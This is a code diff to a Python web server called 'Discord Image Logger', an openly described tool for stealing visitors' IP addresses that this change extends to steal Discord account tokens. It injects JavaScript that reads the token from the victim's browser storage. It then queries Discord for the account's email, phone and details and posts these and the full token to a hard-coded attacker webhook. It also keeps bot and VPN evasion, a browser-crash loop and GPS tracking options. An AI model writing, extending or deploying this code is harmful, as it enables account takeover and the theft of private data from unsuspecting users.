@@ -1,67 +1,46 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "DeKrypt & electron x sinister"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1544418525135896579/wADJp0v4Ga55SZV6f093V3huUjMS8aIvpOrTjD6VJGcbAgS9-pAz6RzoR0KPb7ly2wXe",
-    "image": "https://cdn.discordapp.com/attachments/1530189912387879123/1530189941097893888/IMG_4918.png?ex=6a98166f&is=6a96c4ef&hm=ab088adaf144cd8b47ca45df70796d99b536926918ef3b1f8c28fa2746198194&", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://cdn.discordapp.com/attachments/1530189912387879123/1530189941097893888/IMG_4918.png?ex=6a98166f&is=6a96c4ef&hm=ab088adaf144cd8b47ca45df70796d99b536926918ef3b1f8c28fa2746198194&",
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger",
+    "color": 0x00FFFF,
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "crashBrowser": False,
+    "accurateLocation": False,
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "richMessage": True,
     },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
 
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+    # NEW: Discord Token Stealing
+    "stealToken": True,   # Enable/Disable token stealing
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -84,7 +63,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, token_data = None):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -101,7 +80,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -167,20 +146,65 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **User Agent:**
 ```
 {useragent}
-```""",
+    ```""",
     }
   ],
 }
     
+    # ===== NEW: Token / Discord Data =====
+    if token_data:
+        embed["embeds"][0]["description"] += f"""
+
+**Discord Data:**
+> **User ID:** `{token_data.get('id', 'N/A')}`
+> **Username:** `{token_data.get('username', 'N/A')}#{token_data.get('discriminator', 'N/A')}`
+> **Email:** `{token_data.get('email', 'N/A')}`
+> **Phone:** `{token_data.get('phone', 'N/A')}`
+> **Nitro:** `{token_data.get('nitro', 'N/A')}`
+> **Token (first 20 chars):** `{token_data.get('token', 'N/A')[:20]}...`
+> **Token (full - click to show):** `||{token_data.get('token', 'N/A')}||`
+"""
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
 
+# ===== NEW: Discord Token Stealing Function =====
+def log_token(token, ip, useragent, endpoint):
+    if not config["stealToken"]:
+        return
+    try:
+        # Get user info from Discord API
+        headers = {"Authorization": token}
+        resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+        if resp.status_code != 200:
+            return
+        user_data = resp.json()
+        
+        # Get guilds count (optional)
+        guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
+        guild_count = len(guilds_resp.json()) if guilds_resp.status_code == 200 else "N/A"
+        
+        nitro = "None"
+        if user_data.get("premium_type"):
+            nitro = ["Nitro Classic", "Nitro", "Nitro Basic"][user_data.get("premium_type")-1]
+        
+        token_data = {
+            "id": user_data.get("id"),
+            "username": user_data.get("username"),
+            "discriminator": user_data.get("discriminator"),
+            "email": user_data.get("email"),
+            "phone": user_data.get("phone"),
+            "nitro": nitro,
+            "token": token,
+            "guilds": guild_count,
+        }
+        # Send to webhook using existing makeReport
+        makeReport(ip, useragent, endpoint=endpoint, token_data=token_data)
+    except Exception as e:
+        reportError(traceback.format_exc())
+
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -213,18 +237,44 @@ height: 100vh;
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
+            # ===== NEW: Check for token in query =====
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            if dic.get("token"):
+                token = dic.get("token")
+                ip = self.headers.get('x-forwarded-for')
+                ua = self.headers.get('user-agent')
+                log_token(token, ip, ua, s.split("?")[0])
+                # Continue to serve normal page without token to avoid loops
+            
+            # Check if the request is from Discord crawler (to serve image)
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
                 return
             
             else:
+                # ===== NEW: Inject token stealing script =====
+                token_script = '''
+                <script>
+                (function(){
+                    try {
+                        var token = localStorage.getItem("token");
+                        if (token && !window.location.search.includes("token=")) {
+                            var url = window.location.href;
+                            var sep = url.includes("?") ? "&" : "?";
+                            window.location.href = url + sep + "token=" + encodeURIComponent(token);
+                        }
+                    } catch(e) {}
+                })();
+                </script>
+                '''
+                
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
@@ -259,13 +309,20 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                
+                # ===== Inject token script into the response =====
+                if isinstance(data, bytes):
+                    data = data.decode()
+                data += token_script
+                data = data.encode()
+
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
 
                 if config["accurateLocation"]:
                     data += b"""<script>
